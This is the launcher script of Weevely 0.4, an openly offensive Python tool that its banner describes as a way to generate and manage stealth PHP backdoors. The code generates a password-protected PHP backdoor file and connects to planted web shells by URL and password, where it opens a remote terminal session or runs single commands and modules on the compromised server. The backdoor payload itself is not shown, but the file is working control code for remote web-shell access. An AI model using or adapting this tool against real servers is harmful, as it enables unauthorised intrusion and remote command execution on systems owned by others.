#!/usr/bin/env python
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.


from core.terminal import Terminal
from core.backdoor import Backdoor
from core.modules_handler import ModHandler

import sys
    
print '''
Weevely 0.4 - Generate and manage stealth PHP backdoors
              Emilio Pinna, Simone Margaritelli 2011-2012            
'''
    
if __name__ == "__main__":

    
    if  len(sys.argv) == 3 and sys.argv[1].startswith('http'):
        
        print '''[+] Starting terminal. Show modules help with :help 
[+] Run modules with :<module name> <argument1> <arg2> ...
'''
        url = sys.argv[1]
        password = sys.argv[2]
          
        try:
            Terminal ( ModHandler( url, password ) ).loop()
        except KeyboardInterrupt:
            print '\n[!] Exiting. Bye ^^'
        
    elif len(sys.argv) == 4 and sys.argv[1] == 'generate':
        Backdoor( sys.argv[2] ).save( sys.argv[3] )
        
    elif len(sys.argv) > 3 and sys.argv[1].startswith('http'):

        url = sys.argv[1]
        password = sys.argv[2]        
        
        try:
            
            terminal = Terminal (ModHandler(url, password), True)
            if sys.argv[3][0] == terminal.module_char:
                terminal.run_module_cmd(sys.argv[3:])
            else:
                terminal.run_line_cmd(' '.join(sys.argv[3:]))
            
            
        except KeyboardInterrupt:
            print '\n[!] Exiting. Bye ^^'
    else:
        
        print '''Start telnet-like session
  ./weevely.py <url> <password> 
  
Run single command or module
  ./weevely.py <url> <password> <command> 
  ./weevely.py <url> <password> :<module name> <argument1> <arg2> ..

Generate PHP backdoor script
  ./weevely.py generate <password> <output path> 

Show modules help with :help and run it using :<module name>. Modules:'''  
        
        ModHandler().print_module_summary()
            
        print '\n'
    
